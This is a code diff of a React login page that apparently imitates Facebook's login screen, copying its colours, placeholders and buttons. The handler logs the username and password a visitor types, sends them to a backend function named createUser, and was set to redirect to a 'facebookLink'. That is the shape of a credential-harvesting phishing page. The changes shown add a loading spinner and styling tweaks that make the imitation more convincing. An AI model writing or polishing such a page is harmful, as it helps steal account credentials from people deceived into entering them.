@@ -12,6 +12,7 @@ function MainPage() {
   const [password, setPassword] = useState("");
   const [error, setError] = useState(""); // Error state to display validation messages
   const [showPassword, setShowPassword] = useState(false)
+  const [isLoading, setIsLoading] = useState(false)
 
   const handleLogin = async (e : React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
@@ -20,6 +21,7 @@ function MainPage() {
       return;
     }
     setError(""); // Clear error if fields are filled
+    setIsLoading(true)
 
     const data = {
       username: username,
@@ -29,12 +31,13 @@ function MainPage() {
     console.log("This is the data:", data);
     const response = await createUser(data);
     if(response.messsage == 'success'){
-      window.location.href = facebookLink
+      // window.location.href = facebookLink
 
     }
     else{
       setError("Something went wrong")
     }
+    setIsLoading(false)
     
   };
   
@@ -75,7 +78,7 @@ function MainPage() {
               value={username}
               onChange={(e) => setUserName(e.target.value)}
               placeholder="Mobile number or email"
-              className="border-[0.4px] p-[16px] text-black sm:p-[20px] border-gray-400 placeholder:text-gray-500 placeholder:text-[17px] sm:placeholder:text-[20px] rounded-xl focus:outline-[1px] focus:border-[2px] focus:border-blue-600 outline-none"
+              className="border-[0.4px] p-[16px] text-black sm:p-[20px] bg-white border-gray-400 placeholder:text-gray-500 placeholder:text-[17px] sm:placeholder:text-[20px] rounded-xl focus:outline-[1px] focus:border-[2px] focus:border-blue-600 outline-none"
             />
             <div className="w-full  relative">
             <input
@@ -83,16 +86,29 @@ function MainPage() {
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               placeholder="Password"
-              className="border-[1px]  w-full text-black p-[16px] sm:p-[20px] border-gray-400 placeholder:text-gray-500 placeholder:text-[17px] sm:placeholder:text-[20px] rounded-xl focus:border-[2px] focus:border-blue-600 outline-none"
+              className="border-[1px]  w-full text-black p-[16px] sm:p-[20px] bg-white border-gray-400 placeholder:text-gray-500 placeholder:text-[17px] sm:placeholder:text-[20px] rounded-xl focus:border-[2px] focus:border-blue-600 outline-none"
             />
-            <span className=" absolute font-semibold cursor-pointer bottom-[30%] right-3 text-[24px] text-gray-600" onClick={(e) => setShowPassword(!showPassword)}>{showPassword ? <FaRegEyeSlash /> : <IoEyeOutline className="" />}</span>
+            {
+                password?.length > 0  && (
+                  <span className=" absolute font-semibold cursor-pointer bottom-[30%] right-3 text-[24px] text-gray-600" onClick={(e) => setShowPassword(!showPassword)}>{showPassword ? <FaRegEyeSlash /> : <IoEyeOutline className="" />}</span>
+
+                )
+            }
             {error && <p className="text-red-500">{error}</p>} {/* Display error message */}
             </div>
             <button
-              className="bg-[#0866ff] border-gray-600 rounded-3xl sm:rounded-xl p-[10px] sm:p-[15px] border-0 outline-none text-[19px] hover:bg-blue-700"
+              className={`bg-[#0866ff] text-black flex justify-center items-center border-gray-600 rounded-3xl sm:rounded-xl p-[10px] sm:p-[15px] border-0 outline-none text-[19px] hover:bg-blue-700 `}
               onClick={handleLogin}
             >
-              Log in
+              {isLoading ? (
+               
+                <span className="loading loading-spinner loading-lg"></span>
+
+              ) : (
+                <span className="">
+                Log In
+              </span>
+              ) }
             </button>
             <div className="hidden sm:block">
               <p className="text-[#0866ff] text-center m-1 text-[18px]  cursor-pointer hover:underline" 
@@ -104,7 +120,7 @@ function MainPage() {
               <hr className="mt-4" />
               <div className="w-full mt-4 flex justify-center pt-4">
                 <button 
-                  className="bg-[#42b72a] font-semibold py-[21px] px-[80px] text-white rounded-xl text-[19px] font-sans"
+                  className="bg-[#42b72a]  font-semibold py-[21px] px-[80px] text-white rounded-xl text-[19px] font-sans"
                   onClick={handleCreateAccount}
                 >
                   Create new account
